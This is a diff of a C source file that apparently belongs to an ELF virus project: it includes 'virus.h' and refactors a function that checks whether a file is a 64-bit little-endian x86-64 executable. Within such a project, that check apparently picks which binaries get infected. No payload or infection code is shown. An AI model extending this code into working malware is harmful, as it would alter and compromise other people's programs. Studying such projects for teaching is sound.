@@ -1,8 +1,19 @@
 #include "virus.h"
 #include "syscalls.h"
 #include "utils.h"
+#include "logs.h"
 #include "errors.h"
-#include "log.h"
+
+#define DELFMAG		((char[4]){ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3})
+
+#define is_not_elf(e_ident)           (memcmp(e_ident, DELFMAG, SELFMAG) != 0)
+#define is_not_64bit(e_ident)         (e_ident[EI_CLASS] != ELFCLASS64)
+#define is_not_little_endian(e_ident) (e_ident[EI_DATA] != ELFDATA2LSB)
+#define is_not_executable(e_type)     (e_type != ET_EXEC && e_type != ET_DYN)
+#define is_not_x86_64(e_machine)      (e_machine != EM_X86_64)
+#define has_no_entry(e_entry)         (e_entry == 0)
+#define has_no_phoff(e_phoff)         (e_phoff == 0)
+#define has_no_shoff(e_shoff)         (e_shoff == 0)
 
 static bool	is_elf64(const char *file)
 {
@@ -11,13 +22,15 @@ static bool	is_elf64(const char *file)
 
 	if (fd < 0) return errors(ERR_SYS, _ERR_S_OPEN_FAILED);
 
-	if (sys_read(fd, &hdr, sizeof(Elf64_Ehdr)) < (ssize_t)sizeof(Elf64_Ehdr)
-	|| memcmp(hdr.e_ident, (char[4]){ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3}, SELFMAG) != 0 // wrong Magic
-	|| hdr.e_ident[EI_CLASS] != ELFCLASS64        // not 64bit
-	|| hdr.e_ident[EI_DATA] != ELFDATA2LSB        // not little endian
-	|| hdr.e_entry == 0                           // no entry point
-	|| hdr.e_phoff == 0                           // no program hdr table
-	|| hdr.e_shoff == 0)                          // no section hdr table
+	if (sys_read(fd, &hdr, sizeof(hdr)) < (ssize_t)sizeof(hdr)
+	|| is_not_elf(hdr.e_ident)
+	|| is_not_64bit(hdr.e_ident)
+	|| is_not_little_endian(hdr.e_ident)
+	|| is_not_executable(hdr.e_type)
+	|| is_not_x86_64(hdr.e_machine)
+	|| has_no_entry(hdr.e_entry)
+	|| has_no_phoff(hdr.e_phoff)
+	|| has_no_shoff(hdr.e_shoff))
 	{
 		sys_close(fd);
 		return errors(ERR_USAGE, _ERR_U_NOT_ELF);
